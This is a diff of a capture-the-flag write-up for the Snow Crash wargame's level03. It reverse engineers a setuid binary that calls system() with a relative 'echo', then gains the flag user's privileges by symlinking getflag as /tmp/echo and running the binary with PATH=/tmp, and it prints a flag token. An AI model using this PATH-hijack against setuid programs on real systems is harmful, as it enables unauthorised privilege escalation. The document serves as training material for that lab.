@@ -2,23 +2,38 @@
 
 ## Steps
 
-1. __Action__ (Guest): list the files present at the root
+1. __Action__ (Guest): list the files present in the `level03` user's home directory
 	```sh
 	ls -A
 	```
 
-2. __Observation__ (Guest): the previous command reveals a `level03` file
+2. __Observation__ (Guest): the previous command reveals 1 file possibly of interest,
+	named `level03`
 	```
-	.bash_logout  .bashrc  level03  .profile
+	.bash_logout  .bashrc  .profile  level03
 	```
 
-3. __Action__ (Guest): get more information on the file
+3. __Action__ (Guest): check the type of the `level03` file
+	```sh
+	file -b level03
+	```
+
+4. __Observation__ (Guest): the previous command reveals that the `level03` file
+	is an ELF 32-bits executable
+	```
+	setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x3bee584f790153856e826e38544b9e80ac184b7b, not stripped
+	```
+
+5. __Action__ (Guest): check the file access control list of the `level03` file
 	```sh
 	getfacl level03
 	```
 
-4. __Observation__ (Guest): the previous command reveals the file is an
-	executable and has the `setuid` and the `setgid` bits enabled
+6. __Observation__ (Guest): the previous command reveals that the `level03` file:
+	- is readable by the `level03` user
+	- is executable by the `level03` user
+	- is owned by the `flag03` user
+	- has the `setuid` bit enabled
 	```
 	# file: level03
 	# owner: flag03
@@ -29,57 +44,57 @@
 	other::r-x
 	```
 
-4. __Action__ (Guest): execute the executable
+7. __Action__ (Host): copy the `level03` file from the virtual machine
 	```sh
-	./level03
+	sshpass -f level02/flag 2>/dev/null \
+		scp -P 4242 level03@192.168.122.214:level03 /tmp
 	```
 
-5. __Observation__ (Guest): the message `Exploit me` appears on stdout
+8. __Action__ (Host): decompile the `level03` file using [dogbolt](https://dogbolt.org/),
+	and manually improve the readability of the decompiled code
 
-6. __Action__ (Host): copy the `level03` file from the virtual machine
-	```sh
-	sshpass -f snow-crash/level02/flag \
-	scp -P 4242 level03@192.168.56.101:/home/user/level03/level03 level03
-	docker cp snow-crash:level03 level03
-	```
-
-7. __Action__ (Host): decompile the `level03` file using [dogbolt](https://dogbolt.org/)
-
-8. __Observation__ (Host): a few things are to observe here
+9. __Observation__ (Host): after reverse engineering the `level03` file, we obtain the following
+	C code, which sets the real, effective, and saved user and group IDs, and then
+	invokes the `/usr/bin/env echo Exploit me` command through the `system` function,
+	which is a security vulnerability when used to call a command
+	without specifying its absolute path
 	```c
-	// ------------------------ Functions -------------------------
+	#include <unistd.h>
 
-	// From module:   /home/user/level03/level03.c
-	// Address range: 0x80484a4 - 0x8048505
-	// Line range:    7 - 18
-	int main() {
-		int32_t v1 = getegid(); // 0x80484ad
-		int32_t v2 = geteuid(); // 0x80484b6
-		setresgid(v1, v1, v1);
-		setresuid(v2, v2, v2);
+	int main(void) {
+		gid_t const gid = getegid();
+		uid_t const uid = geteuid();
+
+		setresgid(gid, gid, gid);
+		setresuid(uid, uid, uid);
+
 		return system("/usr/bin/env echo Exploit me");
 	}
 	```
-	- The effective GID and UID are stored in variables `v1` and `v2`.
-	- Those variables are used to set the real, effective and saved ID of both the user and group.
 
-9. __Observation__ (Guest): we need to run `getflag` when running `./level03`
-	as we'll have the same ID as `flag03` when we'll do it. This will be done
-	by creating a symbolic link between the `getflag` and the `echo` commands
-
-10. __Action__ (Guest): create a symbolic link between `getflag` and `echo`
-	adding a new path in `PATH`
+10. __Action__ (Host): remove the `level03` file
 	```sh
-	export PATH=/tmp:$PATH
-	ln -s $(which getflag) /tmp/echo
+	rm /tmp/level03
 	```
 
-11. __Action__ (Guest): execute `./level03`
+11. __Action__ (Guest): create a symbolic link to the `getflag` file named `echo`
+	to exploit the security vulnerability mentioned above
 	```sh
-	./level03
+	ln -s $( which getflag ) /tmp/echo
 	```
 
-12. __Observation__ (Guest): the flag is displayed on stdout
+12. __Action__ (Host): execute `./level03` with an altered environment
+	to make it invoke our `echo` symbolic link instead of the real `echo` command
+	and save the token in the `flag` file
+	```sh
+	sshpass -f level02/flag 2>/dev/null \
+		ssh -p 4242 level03@192.168.122.214 \
+			env PATH=/tmp \
+				./level03 \
+	| egrep -o '[^ ]+$' >level03/flag
 	```
-	Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
+
+13. __Action__ (Guest): remove the `echo` symbolic link
+	```sh
+	rm /tmp/echo
 	```
